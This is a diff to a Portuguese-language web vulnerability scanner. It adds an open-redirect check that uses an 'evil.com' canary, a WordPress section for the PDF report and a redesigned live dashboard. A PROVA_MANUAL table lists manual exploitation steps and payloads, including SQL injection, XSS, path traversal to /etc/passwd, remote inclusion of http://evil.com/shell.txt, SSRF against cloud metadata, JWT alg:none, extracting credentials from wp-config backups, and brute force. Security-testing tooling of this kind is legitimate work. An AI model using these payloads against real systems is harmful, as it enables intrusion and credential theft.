@@ -8926,8 +8926,17 @@ class VulnScanner:
         return urlunparse([parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, fuzzed, parsed.fragment])
 
+    # Domínio canário usado em todos os payloads — o redirect deve terminar AQUI
+    _OR_CANARY = "evil.com"
+
     def _or_test_one(self, fuzzed_url, payload, origin_netloc):
-        """Retorna (filled_url, redirect_chain) se redirect externo confirmado, None caso contrário."""
+        """Retorna (filled_url, redirect_chain) se redirect para evil.com confirmado, None caso contrário.
+
+        Validação dupla:
+        1. O destino final não pode ser o mesmo domínio do alvo (evita falso negativo)
+        2. O destino final DEVE conter o canário 'evil.com' — sem isso é redirect legítimo
+           do próprio servidor (ex: Rebrandly, CDN, WAF), não um Open Redirect explorável.
+        """
         if _cancel_event.is_set():
             return None
         filled = fuzzed_url.replace("FUZZ", payload)
@@ -8935,8 +8944,11 @@ class VulnScanner:
             r = requests.get(filled, headers=HEADERS_BASE, timeout=8,
                              verify=False, allow_redirects=True)
             if r.history:
-                final_netloc = urlparse(r.url).netloc
-                if final_netloc and final_netloc != origin_netloc:
+                final_netloc = urlparse(r.url).netloc.lower()
+                final_url_lower = r.url.lower()
+                # Critério: destino diferente do alvo E contém o canário evil.com
+                if (final_netloc and final_netloc != origin_netloc
+                        and self._OR_CANARY in final_url_lower):
                     chain = " → ".join(str(h.url) for h in r.history) + f" → {r.url}"
                     return (filled, chain)
         except Exception:
@@ -10660,7 +10672,7 @@ class VulnScanner:
 
             # Secret patterns
             for pattern, label, severity in SECRET_PATTERNS:
-                for m in re.finditer(pattern, content, re.I)[:2]:
+                for m in list(re.finditer(pattern, content, re.I))[:2]:
                     hit = m.group(0)[:80]
                     found.append({
                         "file": js_url[:80], "type": label,
@@ -11749,7 +11761,7 @@ class VulnScanner:
         _scan_start = time.time()
         # ── Auto-scaling de workers ──────────────────────────────────────────
         # Base workers por intensidade (valores mínimos)
-        _base_workers = {0.3: 12, 0.6: 20, 1.0: 32}.get(_PAYLOAD_INTENSITY, 20)
+        _base_workers = {0.1: 6, 0.3: 12, 0.6: 20, 1.0: 32}.get(_PAYLOAD_INTENSITY, 20)
         # Escalar com base no número de URLs (mais URLs = mais threads)
         _n_urls = len(self.urls) if hasattr(self, 'urls') else 1
         if _n_urls > 100:
@@ -11757,7 +11769,7 @@ class VulnScanner:
         elif _n_urls > 50:
             _base_workers = min(_base_workers + 8, 48)   # até 48 para médios
         _workers_display = _base_workers
-        _intensity_label = {0.3: "MEDIUM", 0.6: "HARD", 1.0: "INSANE"}.get(_PAYLOAD_INTENSITY, "HARD")
+        _intensity_label = {0.1: "EASY", 0.3: "MEDIUM", 0.6: "HARD", 1.0: "INSANE"}.get(_PAYLOAD_INTENSITY, "HARD")
         print(f"\n{Fore.CYAN}{Style.BRIGHT}"
               f"  ══════ FASE 2 — {total} CHECKS EM PARALELO ({_workers_display} workers/grupo) ══════"
               f"{Style.RESET_ALL}\n", flush=True)
@@ -11795,7 +11807,7 @@ class VulnScanner:
                 _active_checks[tid] = label
             _show_active()
             # Timeout escalonado: checks com muitas URLs ganham mais tempo
-            _check_timeout = 90 if _PAYLOAD_INTENSITY >= 1.0 else (60 if _PAYLOAD_INTENSITY >= 0.6 else 45)
+            _check_timeout = 90 if _PAYLOAD_INTENSITY >= 1.0 else (60 if _PAYLOAD_INTENSITY >= 0.6 else (45 if _PAYLOAD_INTENSITY >= 0.3 else 25))
             try:
                 with ThreadPoolExecutor(max_workers=1) as _t:
                     _t.submit(check_fn).result(timeout=_check_timeout)
@@ -13592,7 +13604,55 @@ class CyberBrowser:
 # ─────────────────────────────────────────────────────────────────────────────
 class ReportGenerator:
 
-    # Paleta de cores
+    # ── Guia de prova manual por vuln_id ──────────────────────────────────────
+    PROVA_MANUAL = {
+        # OWASP Injection
+        1:  "1) Identificar parâmetros GET/POST. 2) Inserir payload: ' OR '1'='1. 3) Observar erro SQL ou mudança de resposta. 4) Confirmar com sqlmap -u URL --level=3.",
+        2:  "1) Enviar payload booleano: ?id=1 AND SLEEP(5). 2) Medir tempo de resposta. Delta >4s = SQLi Blind confirmado.",
+        3:  "1) Injetar payload XSS: <script>alert(document.domain)</script>. 2) Verificar se executa no browser. 3) Tentar variações: <img src=x onerror=alert(1)>.",
+        4:  "1) Inserir payload XSS stored em campo persistente (comentário, nome). 2) Recarregar a página. 3) Se alert disparar = XSS Stored confirmado.",
+        5:  "1) Injetar no parâmetro: ?page=../../../../etc/passwd. 2) Verificar se conteúdo sensível aparece na resposta. 3) Tentar com null byte: %00.",
+        6:  "1) Testar inclusão remota: ?page=http://evil.com/shell.txt. 2) Verificar se o servidor faz GET externo via Burp Collaborator.",
+        7:  "1) Injetar no parâmetro: ?cmd=id. 2) Verificar se saída do comando aparece na resposta. 3) Tentar: ; whoami, | id, && id.",
+        8:  "1) Enviar SSRF: ?url=http://169.254.169.254/latest/meta-data/. 2) Verificar se metadados AWS retornam. 3) Usar Burp Collaborator para SSRF cego.",
+        9:  "1) Enviar payload XXE em body XML. 2) Verificar leitura de /etc/passwd. 3) Tentar XXE via file:// e expect://.",
+        10: "1) Injetar template: ?input={{7*7}}. 2) Se resposta contém 49 = SSTI confirmado. 3) Tentar: ${7*7}, #{7*7}, {{config}}.",
+        11: "1) Injetar: {\"$where\": \"sleep(3000)\"}. 2) Medir tempo. 3) Tentar: ?q[$ne]=x para bypass de auth.",
+        12: "1) Verificar token CSRF em formulários. 2) Criar página HTML com formulário apuntando ao alvo sem token. 3) Submeter e verificar se aceita.",
+        13: "1) Logar como user A, pegar ID do recurso. 2) Como user B, acessar /api/resource/{id_de_A}. 3) Se retornar dados = IDOR.",
+        14: "1) Tentar acessar /admin, /dashboard sem autenticação. 2) Manipular cookie role=user para role=admin. 3) Testar com X-Original-URL: /admin.",
+        15: "1) Acessar recursos com configuração padrão (admin/admin). 2) Verificar headers de segurança ausentes. 3) Checar versões expostas no Server header.",
+        16: "1) Verificar versões de bibliotecas JS no HTML. 2) Buscar CVEs no nvd.nist.gov para as versões. 3) Testar payloads específicos do CVE.",
+        17: "1) Interceptar token JWT com Burp. 2) Decodar (jwt.io). 3) Alterar alg:none, retirar assinatura. 4) Testar com jwt_tool: python jwt_tool.py TOKEN -X a.",
+        18: "1) Buscar secrets no código-fonte (view-source). 2) Verificar .env, .git/config acessíveis. 3) Checar comentários HTML com credenciais.",
+        # WordPress
+        301: "1) Verificar meta generator: curl -s URL | grep 'WordPress'. 2) Comparar versão com changelogs em wordpress.org/news/. 3) CVE-search: cve.mitre.org/?query=wordpress+VERSION.",
+        302: "1) Buscar CVE da versão em nvd.nist.gov. 2) Testar PoC público disponível no ExploitDB. 3) Verificar patch disponível e urgência de update.",
+        303: "1) Acessar /wp-json/wp/v2/users. 2) Verificar usuários listados. 3) Tentar login com usuário + senha comum (admin/admin). 4) Usar wpscan --enumerate u.",
+        304: "1) Verificar versão do plugin no /wp-content/plugins/PLUGIN/readme.txt. 2) Buscar CVE no wpvulndb.com. 3) Testar PoC do ExploitDB.",
+        305: "1) Acessar /wp-admin/admin-ajax.php com método POST. 2) Enviar requisição XMLRPC: system.listMethods. 3) Testar brute-force via XMLRPC com hydra.",
+        306: "1) Verificar versão do tema em /wp-content/themes/TEMA/style.css. 2) Buscar CVE no wpvulndb.com. 3) Verificar se tema tem vulnerabilidade de upload.",
+        307: "1) POST para /xmlrpc.php com: <methodCall><methodName>system.listMethods</methodName></methodCall>. 2) Se retornar XML com métodos = ativo. 3) Tentar: wp.getUsersBlogs para brute-force.",
+        308: "1) GET /wp-login.php com credenciais inválidas. 2) Observar diferença de resposta entre usuário válido e inválido. 3) Automatizar com wpscan --password-attack xmlrpc.",
+        309: "1) GET /wp-content/debug.log. 2) Se retornar 200 com conteúdo = exposto. 3) Analisar log em busca de credenciais, paths, erros.",
+        310: "1) GET /wp-cron.php repetidamente. 2) Se aceitar sem autenticação = exposto a DoS. 3) Testar impacto enviando 100 requests simultâneos.",
+        311: "1) GET /wp-content/uploads/. 2) Se retornar listagem de arquivos = Directory Listing. 3) Baixar e analisar arquivos sensíveis encontrados.",
+        312: "1) GET /wp-login.php?action=register. 2) Registrar conta de teste. 3) Verificar que papel atribuído (subscriber vs admin).",
+        313: "1) Tentar GET /wp-config.php.bak, /wp-config.php~, /wp-config.old. 2) Se retornar 200 = credenciais DB expostas. 3) Extrair DB_NAME, DB_USER, DB_PASSWORD.",
+        314: "1) GET /wp-json/wp/v2/posts. 2) Verificar dados expostos sem auth. 3) GET /wp-json/wp/v2/users para enumerar usuários. 4) Testar endpoints admin sem token.",
+        315: "1) GET /readme.html e verificar versão exposta. 2) GET /wp-includes/ para directory listing. 3) Remover arquivos de info e proteger com .htaccess.",
+        # Generic / outros
+        93: "1) Baixar arquivo JS: curl URL/main.js. 2) Buscar padrões: grep -E 'api[_-]key|AKIA|sk_live' arquivo.js. 3) Testar chave encontrada na API correspondente.",
+        94: "1) Verificar certificado TLS: openssl s_client -connect HOST:443. 2) Checar data de expiração. 3) Testar protocolos fracos: nmap --script ssl-enum-ciphers -p 443 HOST.",
+        95: "1) Injetar header: Host: evil.com. 2) Verificar se resposta reflete host injetado. 3) Tentar cache poisoning com X-Forwarded-Host.",
+        96: "1) Enviar requisição com Transfer-Encoding e Content-Length simultaneamente. 2) Usar ferramenta smuggler.py ou Burp HTTP Request Smuggler.",
+        97: "1) Checar URL por tokens/senhas: inspect query string. 2) Verificar referer que vaza token. 3) Analisar entropy dos valores de parâmetros.",
+        98: "1) Verificar presença: GET /.well-known/security.txt. 2) Validar campos: Contact, Expires, Encryption, Policy. 3) Reportar via email em Contact: se há bug bounty.",
+        99: "1) Acessar /robots.txt e mapear paths bloqueados. 2) Tentar acessar todos os paths de Disallow diretamente. 3) Verificar paths admin, backup, api.",
+        100: "1) Testar sem autenticação via múltiplas requisições. 2) Verificar headers de rate-limit: X-RateLimit-Remaining. 3) Burst: ab -n 200 -c 50 URL.",
+    }
+
+    # ── Paleta de cores ───────────────────────────────────────────────────────
     _C = {
         "navy":    "#0f172a",
         "blue":    "#1e40af",
@@ -13835,11 +13895,13 @@ class ReportGenerator:
                                          textColor=colors.HexColor(color), leading=11)),
             ]
 
+        prova = self.PROVA_MANUAL.get(r.vuln_id, "Validar manualmente: reproduzir o payload na ferramenta Burp Suite, confirmar resposta anômala e documentar evidência antes de reportar.")
         body = Table([
             _field("URL / ALVO",    r.url, "#1e293b"),
             _field("EVIDÊNCIA",     r.evidence, "#7c3aed"),
             _field("TÉCNICA",       r.technique),
             _field("RECOMENDAÇÃO",  r.recommendation, "#166534", 220),
+            _field("PROVA MANUAL",  prova, "#7c2d12", 350),
         ], colWidths=[2.8*cm, 13.5*cm])
         body.setStyle(TableStyle([
             ("BACKGROUND",    (0,0), (-1,-1), colors.white),
@@ -14068,21 +14130,173 @@ class ReportGenerator:
             story.append(t3)
             story.append(PageBreak())
 
+        # ─────────────────────── WORDPRESS SECURITY AUDIT ────────────────────
+        wp_json_path = os.path.join(self.output_dir, "wp_audit.json")
+        wp_data = None
+        if os.path.isfile(wp_json_path):
+            try:
+                with open(wp_json_path, encoding="utf-8") as _wf:
+                    wp_data = json.load(_wf)
+            except Exception:
+                wp_data = None
+
+        if wp_data:
+            story.append(self._section_header("WordPress Security Audit"))
+            story.append(Spacer(1, 0.3*cm))
+
+            # Summary row
+            wp_version = wp_data.get("version", "Desconhecida")
+            wp_plugins = wp_data.get("plugins", [])
+            wp_themes  = wp_data.get("themes", [])
+            wp_users   = wp_data.get("users", [])
+            wp_findings= wp_data.get("findings", [])
+            wp_cves    = wp_data.get("cves", [])
+
+            wp_meta_rows = [
+                [Paragraph("<b>Campo</b>", st["Bold"]), Paragraph("<b>Detalhe</b>", st["Bold"])],
+                ["Versão WordPress", Paragraph(f"<b>{wp_version}</b>", ParagraphStyle("wpv", fontName="Helvetica-Bold", fontSize=9, textColor=colors.HexColor("#991b1b")))],
+                ["Plugins encontrados", str(len(wp_plugins))],
+                ["Temas encontrados",   str(len(wp_themes))],
+                ["Usuários enumerados", str(len(wp_users))],
+                ["Findings adicionais", str(len(wp_findings))],
+                ["CVEs correlacionados",str(len(wp_cves))],
+            ]
+            twp = Table(wp_meta_rows, colWidths=[5*cm, 11.5*cm])
+            twp.setStyle(TableStyle([
+                ("BACKGROUND",    (0,0), (-1,0), colors.HexColor("#7c2d12")),
+                ("TEXTCOLOR",     (0,0), (-1,0), colors.white),
+                ("FONTNAME",      (0,0), (-1,0), "Helvetica-Bold"),
+                ("FONTNAME",      (0,1), (0,-1), "Helvetica-Bold"),
+                ("FONTSIZE",      (0,0), (-1,-1), 9),
+                ("ROWBACKGROUNDS",(0,1), (-1,-1), [colors.white, colors.HexColor("#fff7ed")]),
+                ("GRID",          (0,0), (-1,-1), 0.3, colors.HexColor("#fed7aa")),
+                ("TOPPADDING",    (0,0), (-1,-1), 5),
+                ("BOTTOMPADDING", (0,0), (-1,-1), 5),
+                ("LEFTPADDING",   (0,0), (-1,-1), 8),
+            ]))
+            story.append(twp)
+            story.append(Spacer(1, 0.4*cm))
+
+            # Plugins table
+            if wp_plugins:
+                story.append(Paragraph("<b>Plugins Detectados</b>",
+                    ParagraphStyle("wph", fontName="Helvetica-Bold", fontSize=10,
+                                   textColor=colors.HexColor("#7c2d12"), spaceAfter=4)))
+                plug_rows = [[Paragraph("<b>Plugin</b>", st["Bold"]),
+                              Paragraph("<b>Versão</b>", st["Bold"]),
+                              Paragraph("<b>Fonte</b>",  st["Bold"])]]
+                for p in wp_plugins[:30]:
+                    plug_rows.append([
+                        Paragraph(str(p.get("slug",""))[:60], st["BodySmall"]),
+                        str(p.get("version","") or "—"),
+                        str(p.get("source",""))[:40],
+                    ])
+                tp = Table(plug_rows, colWidths=[7*cm, 2.5*cm, 7*cm])
+                tp.setStyle(TableStyle([
+                    ("BACKGROUND",    (0,0), (-1,0), colors.HexColor("#78350f")),
+                    ("TEXTCOLOR",     (0,0), (-1,0), colors.white),
+                    ("FONTNAME",      (0,0), (-1,0), "Helvetica-Bold"),
+                    ("FONTSIZE",      (0,0), (-1,-1), 8),
+                    ("ROWBACKGROUNDS",(0,1), (-1,-1), [colors.white, colors.HexColor("#fffbeb")]),
+                    ("GRID",          (0,0), (-1,-1), 0.3, colors.HexColor("#fde68a")),
+                    ("TOPPADDING",    (0,0), (-1,-1), 4),
+                    ("BOTTOMPADDING", (0,0), (-1,-1), 4),
+                    ("LEFTPADDING",   (0,0), (-1,-1), 6),
+                    ("VALIGN",        (0,0), (-1,-1), "TOP"),
+                ]))
+                story.append(tp)
+                story.append(Spacer(1, 0.3*cm))
+
+            # Users table
+            if wp_users:
+                story.append(Paragraph("<b>Usuários Enumerados (Risco de Brute-Force)</b>",
+                    ParagraphStyle("wpuh", fontName="Helvetica-Bold", fontSize=10,
+                                   textColor=colors.HexColor("#7c2d12"), spaceAfter=4)))
+                user_rows = [[Paragraph("<b>Login</b>", st["Bold"]),
+                              Paragraph("<b>ID</b>",    st["Bold"]),
+                              Paragraph("<b>Fonte</b>", st["Bold"])]]
+                for u in wp_users[:20]:
+                    user_rows.append([
+                        Paragraph(str(u.get("login",""))[:40], st["BodySmall"]),
+                        str(u.get("id","—")),
+                        str(u.get("source",""))[:40],
+                    ])
+                tu = Table(user_rows, colWidths=[7*cm, 2.5*cm, 7*cm])
+                tu.setStyle(TableStyle([
+                    ("BACKGROUND",    (0,0), (-1,0), colors.HexColor("#991b1b")),
+                    ("TEXTCOLOR",     (0,0), (-1,0), colors.white),
+                    ("FONTNAME",      (0,0), (-1,0), "Helvetica-Bold"),
+                    ("FONTSIZE",      (0,0), (-1,-1), 8),
+                    ("ROWBACKGROUNDS",(0,1), (-1,-1), [colors.white, colors.HexColor("#fef2f2")]),
+                    ("GRID",          (0,0), (-1,-1), 0.3, colors.HexColor("#fecaca")),
+                    ("TOPPADDING",    (0,0), (-1,-1), 4),
+                    ("BOTTOMPADDING", (0,0), (-1,-1), 4),
+                    ("LEFTPADDING",   (0,0), (-1,-1), 6),
+                ]))
+                story.append(tu)
+                story.append(Spacer(1, 0.3*cm))
+
+            # Themes
+            if wp_themes:
+                story.append(Paragraph("<b>Temas Detectados</b>",
+                    ParagraphStyle("wpth", fontName="Helvetica-Bold", fontSize=10,
+                                   textColor=colors.HexColor("#7c2d12"), spaceAfter=4)))
+                theme_rows = [[Paragraph("<b>Tema</b>", st["Bold"]),
+                               Paragraph("<b>Versão</b>", st["Bold"])]]
+                for th in wp_themes[:15]:
+                    theme_rows.append([
+                        Paragraph(str(th.get("slug",""))[:60], st["BodySmall"]),
+                        str(th.get("version","") or "—"),
+                    ])
+                tth = Table(theme_rows, colWidths=[12*cm, 4.5*cm])
+                tth.setStyle(TableStyle([
+                    ("BACKGROUND",    (0,0), (-1,0), colors.HexColor("#6b21a8")),
+                    ("TEXTCOLOR",     (0,0), (-1,0), colors.white),
+                    ("FONTNAME",      (0,0), (-1,0), "Helvetica-Bold"),
+                    ("FONTSIZE",      (0,0), (-1,-1), 8),
+                    ("ROWBACKGROUNDS",(0,1), (-1,-1), [colors.white, colors.HexColor("#faf5ff")]),
+                    ("GRID",          (0,0), (-1,-1), 0.3, colors.HexColor("#d8b4fe")),
+                    ("TOPPADDING",    (0,0), (-1,-1), 4),
+                    ("BOTTOMPADDING", (0,0), (-1,-1), 4),
+                    ("LEFTPADDING",   (0,0), (-1,-1), 6),
+                ]))
+                story.append(tth)
+                story.append(Spacer(1, 0.3*cm))
+
+            story.append(PageBreak())
+
         # ─────────────────────── VULNERABILIDADES ─────────────────────────────
+        wp_vuln_results = [r for r in vuln_results if r.category == "WordPress"]
+        main_vuln_results = [r for r in vuln_results if r.category != "WordPress"]
         story.append(self._section_header(f"Vulnerabilidades Encontradas — {len(vuln_results)} itens"))
         story.append(Spacer(1, 0.4*cm))
 
-        for sev_label, sev_list in [("CRÍTICO",criticos),("ALTO",altos),("MÉDIO",medios),("BAIXO",baixos)]:
-            if not sev_list:
-                continue
-            sev_hex = {"CRÍTICO":"#991b1b","ALTO":"#92400e","MÉDIO":"#1e40af","BAIXO":"#166534"}.get(sev_label,"#374151")
+        def _render_vuln_group(vuln_list, title_prefix=""):
+            """Render vuln cards grouped by severity."""
+            for sev_label, sev_filter in [("CRÍTICO","CRITICO"),("ALTO","ALTO"),("MÉDIO","MEDIO"),("BAIXO","BAIXO")]:
+                sev_sub = [r for r in vuln_list if r.severity == sev_filter]
+                if not sev_sub:
+                    continue
+                sev_hex = {"CRÍTICO":"#991b1b","ALTO":"#92400e","MÉDIO":"#1e40af","BAIXO":"#166534"}.get(sev_label,"#374151")
+                story.append(Paragraph(
+                    f"<font color='{sev_hex}'><b>■ {title_prefix}Severidade {sev_label} ({len(sev_sub)} item{'s' if len(sev_sub)>1 else ''})</b></font>",
+                    ParagraphStyle("svh", fontName="Helvetica-Bold", fontSize=11,
+                                   textColor=colors.HexColor(sev_hex), spaceBefore=10, spaceAfter=4)))
+                for r in sev_sub:
+                    story.append(self._vuln_card(r, st))
+                    story.append(Spacer(1, 0.25*cm))
+
+        # Main vulnerability checks (non-WordPress)
+        _render_vuln_group(main_vuln_results)
+
+        # WordPress vulnerability cards (separate sub-section)
+        if wp_vuln_results:
+            story.append(Spacer(1, 0.4*cm))
             story.append(Paragraph(
-                f"<font color='{sev_hex}'><b>■ Severidade {sev_label} ({len(sev_list)} item{'s' if len(sev_list)>1 else ''})</b></font>",
-                ParagraphStyle("svh", fontName="Helvetica-Bold", fontSize=11,
-                               textColor=colors.HexColor(sev_hex), spaceBefore=10, spaceAfter=4)))
-            for r in sev_list:
-                story.append(self._vuln_card(r, st))
-                story.append(Spacer(1, 0.25*cm))
+                "<font color='#7c2d12'><b>── WordPress Security Findings ──</b></font>",
+                ParagraphStyle("wpvh", fontName="Helvetica-Bold", fontSize=12,
+                               textColor=colors.HexColor("#7c2d12"), spaceBefore=10, spaceAfter=4)))
+            _render_vuln_group(wp_vuln_results, "WP — ")
 
         # ─────────────────────── CHECKS SEGUROS ──────────────────────────────
         story.append(PageBreak())
@@ -15926,215 +16140,223 @@ _DASHBOARD_HTML = '''<!DOCTYPE html>
 <title>CyberDyne Live</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
-<script>
-tailwind.config = {
-  theme: { extend: { colors: { cyber: '#dc2626' } } }
-}
-</script>
+<script>tailwind.config={theme:{extend:{colors:{cyber:'#dc2626'}}}}</script>
 <style>
-@keyframes pulse-red { 0%,100% { opacity:1 } 50% { opacity:.5 } }
-@keyframes slide-in { from { transform:translateX(100%);opacity:0 } to { transform:translateX(0);opacity:1 } }
-.pulse-red { animation: pulse-red 2s ease-in-out infinite }
-.slide-in { animation: slide-in 0.3s ease-out }
-::-webkit-scrollbar { width:6px } ::-webkit-scrollbar-track { background:#111 } ::-webkit-scrollbar-thumb { background:#333;border-radius:3px }
+html,body{height:100%;overflow:hidden}
+@keyframes pulse-red{0%,100%{opacity:1}50%{opacity:.5}}
+@keyframes slide-in{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+.pulse-red{animation:pulse-red 2s ease-in-out infinite}
+.slide-in{animation:slide-in 0.25s ease-out}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:#111}
+::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:3px}
 </style>
 </head>
-<body class="bg-black text-white min-h-screen font-sans">
+<body class="bg-[#050505] text-white font-sans flex flex-col" style="height:100vh;overflow:hidden">
 
-<!-- Header -->
-<header class="border-b border-red-900/30 px-6 py-4 flex items-center justify-between">
-  <div>
-    <h1 class="text-2xl font-bold tracking-tight">
-      <span class="text-red-500">CYBERDYNE</span> <span class="text-white/60">LIVE</span>
-    </h1>
-    <p id="target" class="text-sm text-white/40 mt-1"></p>
+<!-- HEADER — fixed, never scrolls -->
+<header class="shrink-0 border-b border-red-900/20 px-5 py-3 flex items-center justify-between bg-[#0a0a0a]">
+  <div class="flex items-center gap-4">
+    <h1 class="text-xl font-bold tracking-tight"><span class="text-red-500">CYBERDYNE</span><span class="text-white/40 ml-1.5 text-base font-normal">LIVE</span></h1>
+    <span id="target" class="text-xs text-white/30 font-mono truncate max-w-xs"></span>
   </div>
-  <div class="text-right">
-    <div id="status-badge" class="inline-block px-3 py-1 rounded-full text-xs font-bold bg-red-900/30 text-red-400 pulse-red">SCANNING</div>
-    <p id="elapsed" class="text-sm text-white/40 mt-1 font-mono"></p>
+  <div class="flex items-center gap-3">
+    <span id="status-badge" class="px-2.5 py-1 rounded-full text-xs font-bold bg-red-900/30 text-red-400 pulse-red">SCANNING</span>
+    <span id="elapsed" class="text-xs text-white/30 font-mono"></span>
   </div>
 </header>
 
-<!-- Phase + Progress -->
-<div class="px-6 py-3 border-b border-white/5">
-  <p id="phase" class="text-sm text-white/60 mb-2"></p>
-  <div class="w-full bg-white/5 rounded-full h-2">
-    <div id="progress-bar" class="bg-gradient-to-r from-red-700 to-red-500 h-2 rounded-full transition-all duration-500" style="width:0%"></div>
+<!-- PROGRESS BAR — fixed -->
+<div class="shrink-0 px-5 py-2 border-b border-white/5 bg-[#080808]">
+  <div class="flex items-center justify-between mb-1">
+    <span id="phase" class="text-xs text-white/50"></span>
+    <span id="progress-text" class="text-xs text-white/30 font-mono"></span>
   </div>
-  <p id="progress-text" class="text-xs text-white/30 mt-1 font-mono"></p>
-</div>
-
-<!-- Severity Cards -->
-<div class="grid grid-cols-5 gap-3 px-6 py-4">
-  <div class="bg-red-950/30 border border-red-900/40 rounded-xl p-4 text-center">
-    <p id="cnt-critico" class="text-3xl font-bold text-red-500">0</p>
-    <p class="text-xs text-red-400/60 mt-1 uppercase tracking-wider">Critico</p>
-  </div>
-  <div class="bg-orange-950/20 border border-orange-900/30 rounded-xl p-4 text-center">
-    <p id="cnt-alto" class="text-3xl font-bold text-orange-400">0</p>
-    <p class="text-xs text-orange-400/60 mt-1 uppercase tracking-wider">Alto</p>
-  </div>
-  <div class="bg-blue-950/20 border border-blue-900/30 rounded-xl p-4 text-center">
-    <p id="cnt-medio" class="text-3xl font-bold text-blue-400">0</p>
-    <p class="text-xs text-blue-400/60 mt-1 uppercase tracking-wider">Medio</p>
-  </div>
-  <div class="bg-green-950/20 border border-green-900/30 rounded-xl p-4 text-center">
-    <p id="cnt-baixo" class="text-3xl font-bold text-green-400">0</p>
-    <p class="text-xs text-green-400/60 mt-1 uppercase tracking-wider">Baixo</p>
-  </div>
-  <div class="bg-white/5 border border-white/10 rounded-xl p-4 text-center">
-    <p id="cnt-seguro" class="text-3xl font-bold text-emerald-400">0</p>
-    <p class="text-xs text-white/40 mt-1 uppercase tracking-wider">Seguro</p>
+  <div class="w-full bg-white/5 rounded-full h-1.5">
+    <div id="progress-bar" class="bg-gradient-to-r from-red-800 to-red-500 h-1.5 rounded-full transition-all duration-700" style="width:0%"></div>
   </div>
 </div>
 
-<!-- Main Grid -->
-<div class="grid grid-cols-1 lg:grid-cols-3 gap-4 px-6 pb-4">
-  <!-- Chart (2/3) -->
-  <div class="lg:col-span-2 bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
-    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Timeline de Vulnerabilidades</h3>
-    <canvas id="timeline-chart" height="200"></canvas>
+<!-- SEVERITY CARDS — fixed row -->
+<div class="shrink-0 grid grid-cols-5 gap-2 px-5 py-2 border-b border-white/5">
+  <div class="bg-red-950/20 border border-red-900/30 rounded-lg p-2 text-center">
+    <p id="cnt-critico" class="text-2xl font-bold text-red-500 leading-none">0</p>
+    <p class="text-[10px] text-red-400/50 mt-0.5 uppercase tracking-widest">Critico</p>
   </div>
-  <!-- Recon Stats (1/3) -->
-  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
-    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Recon Stats</h3>
-    <div class="space-y-3 text-sm" id="recon-stats">
-      <div class="flex justify-between"><span class="text-white/40">Subdominios</span><span id="stat-subs" class="font-mono text-white">0</span></div>
-      <div class="flex justify-between"><span class="text-white/40">URLs coletadas</span><span id="stat-urls" class="font-mono text-white">0</span></div>
-      <div class="flex justify-between"><span class="text-white/40">Checks feitos</span><span id="stat-checks" class="font-mono text-white">0</span></div>
-      <div class="flex justify-between"><span class="text-white/40">Vulneraveis</span><span id="stat-vulns" class="font-mono text-red-400">0</span></div>
+  <div class="bg-orange-950/15 border border-orange-900/25 rounded-lg p-2 text-center">
+    <p id="cnt-alto" class="text-2xl font-bold text-orange-400 leading-none">0</p>
+    <p class="text-[10px] text-orange-400/50 mt-0.5 uppercase tracking-widest">Alto</p>
+  </div>
+  <div class="bg-blue-950/15 border border-blue-900/25 rounded-lg p-2 text-center">
+    <p id="cnt-medio" class="text-2xl font-bold text-blue-400 leading-none">0</p>
+    <p class="text-[10px] text-blue-400/50 mt-0.5 uppercase tracking-widest">Medio</p>
+  </div>
+  <div class="bg-green-950/15 border border-green-900/25 rounded-lg p-2 text-center">
+    <p id="cnt-baixo" class="text-2xl font-bold text-green-400 leading-none">0</p>
+    <p class="text-[10px] text-green-400/50 mt-0.5 uppercase tracking-widest">Baixo</p>
+  </div>
+  <div class="bg-white/5 border border-white/10 rounded-lg p-2 text-center">
+    <p id="cnt-seguro" class="text-2xl font-bold text-emerald-400 leading-none">0</p>
+    <p class="text-[10px] text-white/30 mt-0.5 uppercase tracking-widest">Seguro</p>
+  </div>
+</div>
+
+<!-- MAIN SCROLLABLE AREA -->
+<div class="flex-1 overflow-y-auto">
+
+  <!-- Chart + Stats grid -->
+  <div class="grid grid-cols-1 lg:grid-cols-3 gap-3 px-5 pt-3 pb-2">
+    <!-- Timeline Chart -->
+    <div class="lg:col-span-2 bg-[#0c0c0c] border border-white/5 rounded-xl p-3">
+      <p class="text-[11px] font-semibold text-white/40 mb-2 uppercase tracking-widest">Timeline — Vulnerabilidades x Checks</p>
+      <div style="position:relative;height:160px">
+        <canvas id="timeline-chart"></canvas>
+      </div>
+    </div>
+    <!-- Stats -->
+    <div class="bg-[#0c0c0c] border border-white/5 rounded-xl p-3">
+      <p class="text-[11px] font-semibold text-white/40 mb-3 uppercase tracking-widest">Recon Stats</p>
+      <div class="space-y-2.5 text-sm">
+        <div class="flex justify-between items-center"><span class="text-white/40 text-xs">Subdomínios</span><span id="stat-subs" class="font-mono text-white text-sm">0</span></div>
+        <div class="flex justify-between items-center"><span class="text-white/40 text-xs">URLs coletadas</span><span id="stat-urls" class="font-mono text-white text-sm">0</span></div>
+        <div class="flex justify-between items-center"><span class="text-white/40 text-xs">Checks feitos</span><span id="stat-checks" class="font-mono text-white text-sm">0</span></div>
+        <div class="flex justify-between items-center"><span class="text-white/40 text-xs">Vulneráveis</span><span id="stat-vulns" class="font-mono text-red-400 font-bold text-sm">0</span></div>
+      </div>
     </div>
   </div>
-</div>
 
-<!-- Vuln Feed -->
-<div class="px-6 pb-4">
-  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
-    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Vulnerabilidades Detectadas</h3>
-    <div id="vuln-feed" class="space-y-2 max-h-72 overflow-y-auto">
-      <p class="text-white/20 text-sm italic">Aguardando resultados...</p>
+  <!-- Vuln Feed -->
+  <div class="px-5 pb-2">
+    <div class="bg-[#0c0c0c] border border-white/5 rounded-xl p-3">
+      <p class="text-[11px] font-semibold text-white/40 mb-2 uppercase tracking-widest">Vulnerabilidades Detectadas</p>
+      <div id="vuln-feed" class="space-y-1.5 max-h-52 overflow-y-auto">
+        <p class="text-white/20 text-xs italic">Aguardando resultados...</p>
+      </div>
     </div>
